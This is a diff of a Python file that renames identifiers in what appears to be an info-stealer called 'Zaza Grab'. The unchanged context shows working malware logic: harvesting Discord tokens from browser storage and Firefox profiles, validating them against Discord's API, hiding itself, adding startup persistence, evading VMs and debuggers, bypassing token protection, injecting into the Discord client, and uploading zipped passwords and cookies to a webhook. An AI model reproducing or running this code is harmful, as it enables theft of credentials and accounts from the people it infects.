@@ -308,7 +308,7 @@ class auto_copy_wallet(Functions):
             self.loop_through()
 
 
-class bc_initial_func(Functions):
+class zg_initial_func(Functions):
     def __init__(self):
         
         self.dscap1 = "https://discord.com/api/v9/users/@me"
@@ -355,7 +355,7 @@ class bc_initial_func(Functions):
 
         self.tokens = []
 
-        self.bc_id = []
+        self.zg_id = []
 
         self.sep = os.sep;
 
@@ -412,7 +412,7 @@ class bc_initial_func(Functions):
 
 
 
-    def bc_exit_this(self):
+    def zg_exit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
@@ -456,14 +456,14 @@ class bc_initial_func(Functions):
         ]
 
         if self.discord_webhook == "" or self.discord_webhook == "\x57EBHOOK_HERE":
-            self.bc_exit_this()
+            self.zg_exit_this()
             
         self.hidethis()
         self.error_remote()
         self.startupzazagrab()
 
         if self.fetch_conf('dbugkiller') and NoDebugg().inVM is True:
-            self.bc_exit_this()
+            self.zg_exit_this()
         await self.bypass_bttdsc()
         await self.bypass_tokenprtct()
 
@@ -511,7 +511,7 @@ class bc_initial_func(Functions):
         self.natify_matched_tokens()
         await self._inject_disc()
         self.ping_on_running()
-        self.finished_bc()
+        self.finished_zg()
 
     
 
@@ -691,9 +691,9 @@ class bc_initial_func(Functions):
                                     pass
                                 if r.status_code == 200:
                                     uid = r.json()['id']
-                                    if uid not in self.bc_id:
+                                    if uid not in self.zg_id:
                                         self.tokens.append(token)
-                                        self.bc_id.append(uid)
+                                        self.zg_id.append(uid)
             else:
                 for filname in os.listdir(path):
                     if filname[-3:] not in ["log", "ldb"]:
@@ -709,9 +709,9 @@ class bc_initial_func(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.bc_id:
+                                if uid not in self.zg_id:
                                     self.tokens.append(token)
-                                    self.bc_id.append(uid)
+                                    self.zg_id.append(uid)
 
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
@@ -729,9 +729,9 @@ class bc_initial_func(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()['id']
-                                if uid not in self.bc_id:
+                                if uid not in self.zg_id:
                                     self.tokens.append(token)
-                                    self.bc_id.append(uid)
+                                    self.zg_id.append(uid)
 
 
 
@@ -1052,7 +1052,7 @@ GoogleMaps: {self.googlemap}
 
 
 
-    def finished_bc(self):
+    def finished_zg(self):
         for i in os.listdir(self.dir):
             if i.endswith('.txt'):
                 path = self.dir + self.sep + i
@@ -1067,7 +1067,7 @@ GoogleMaps: {self.googlemap}
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(x + "\n\nZaza Grab Create By ZAZA | https://github.com/zazaman4000")
 
-        _zipfile = ntpath.join(self.appdata, f'BC-[{infocom}].zip')
+        _zipfile = ntpath.join(self.appdata, f'zg-[{infocom}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = ntpath.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
@@ -1262,7 +1262,7 @@ class NoDebugg(Functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(bc_initial_func().init())
+    asyncio.run(zg_initial_func().init())
     
 
 
@@ -1367,7 +1367,7 @@ def upload(name, tk=''):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "bc_checking":
+    if name == "zg_checking":
         data = {
         "content": '',
         "embeds": [
@@ -1398,7 +1398,7 @@ def upload(name, tk=''):
     path = name
     files = {'file': open(path, 'rb')}
 
-    if "bc_allpasswords" in name:
+    if "zg_allpasswords" in name:
 
         ra = ' | '.join(da for da in paswWords)
 
@@ -1432,7 +1432,7 @@ def upload(name, tk=''):
         }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
-    if "bc_allcookies" in name:
+    if "zg_allcookies" in name:
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000:
             rrrrr = Reformat(str(cookiWords))
